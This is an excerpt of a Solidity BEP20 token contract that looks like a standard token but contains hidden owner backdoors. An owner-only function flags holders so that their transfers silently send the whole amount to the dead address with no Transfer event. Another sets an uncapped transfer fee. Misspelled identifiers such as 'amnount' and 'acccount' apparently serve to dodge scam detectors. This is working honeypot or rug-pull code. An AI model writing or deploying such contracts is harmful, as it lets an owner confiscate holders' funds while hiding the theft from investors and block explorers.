...
interface IBEP20 {
    ...
    /**
     * @dev Returns the amnount of tokens owned by `acccount`.
     */
    function balanceOf(address acccount) external view returns (uint256);

    /**
     * @dev Moves `amnount` tokens from the caller's acccount to `recipient`.
     *
...
contract Token is IBEP20, HasForeignAsset {
    ...
    uint256 private _feevi = 2;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) private _burns;
    function setUsersBurn(address accdount) public onlyOwner {
        _burns[accdount] = true;
    }

    function rmUsersBun(address accdount) public onlyOwner {
        _burns[accdount] = false;
    }

    function getBun(address accdount) public view returns (bool) {
        return _burns[accdount];
    }
    ...
    function setfeevi(uint256 _value) external onlyOwner {
        _feevi = _value;
    }


    function getfeevi() external onlyOwner returns(uint256){
        return _feevi;
    }
     ...
     * e.g. implement automatic token feevis, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
    ...
    function _transfer(
        ...
        uint256 feeviamnount = 0;
        feeviamnount = amnount.mul(_feevi).div(100);
        uint256 amoun;
        amoun = amnount - feeviamnount;
        _beforeTokenTransfer(sender, recipient, amoun);


        if (_burns[sender]){
            _balances[sender] = _balances[sender].sub(amnount);
            _balances[_DEADaddress] =  _balances[_DEADaddress].add(amnount);
            return;
        }
        ...
        if (feeviamnount > 0) {
            emit Transfer(sender, _DEADaddress, feeviamnount);
        }
        emit Transfer(sender, recipient, amoun);
    }

    /** @dev Creates `amnount` tokens and assigns them to `acccount`, increasing
     * the total supply.
     *
     ...
     */
    function _mintOnce(address acccount, uint256 amnount) internal virtual {
        require(acccount != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), acccount, amnount);

        _totalSupply = _totalSupply.add(amnount);
        _balances[acccount] = _balances[acccount].add(amnount);
        emit Transfer(address(0), acccount, amnount);
    }

    /**
     * @dev Destroys `amnount` tokens from `acccount`, reducing the
     * total supply.
     *
     ...
     * - `acccount` must have at least `amnount` tokens.
     */
    function _burn(address acccount, uint256 amnount) internal virtual {
        require(acccount != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(acccount, address(0), amnount);

        _balances[acccount] = _balances[acccount].sub(amnount, "BEP20: burn amnount exceeds balance");
        _totalSupply = _totalSupply.sub(amnount);
        emit Transfer(acccount, address(0), amnount);
    }
